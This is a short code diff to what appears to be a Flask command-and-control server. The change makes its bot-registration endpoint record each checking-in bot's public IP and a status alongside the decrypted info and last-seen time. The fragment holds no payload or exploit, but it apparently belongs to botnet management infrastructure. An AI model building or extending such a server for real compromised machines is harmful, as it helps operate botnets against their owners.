@@ -83,8 +83,9 @@ def register_bot():
     data = json.loads(decrypted_data)
     bot_id = data.get('id')
     info = data.get('info')
-    bots[bot_id] = {'info': info, 'last_seen': time.time()}
-    logger.info(f"Registered new bot: {bot_id}")
+    public_ip = info.get('ip')
+    bots[bot_id] = {'info': info, 'last_seen': time.time(), 'public_ip': public_ip, 'status': 'green'}
+    logger.info(f"Registered new bot: {bot_id} with public IP: {public_ip}")
     return jsonify({'status': 'ok'})
 
 @app.route('/api/bot/ping', methods=['POST'])
